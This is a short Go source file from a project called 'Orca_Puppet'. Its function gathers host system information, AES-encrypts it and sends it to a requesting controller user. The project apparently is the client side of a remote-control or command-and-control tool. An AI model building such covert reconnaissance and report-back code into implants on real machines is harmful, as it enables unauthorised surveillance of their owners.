package controller

import (
	"Orca_Puppet/cli/cmdopt/infoopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"encoding/json"
)

func infoCmd(sendUserId string) {
	info := infoopt.GetInfo()
	infoData, err := json.Marshal(info)
	if err != nil {
		return
	}
	data, _ := crypto.Encrypt(infoData, []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "info_ret", data)
}
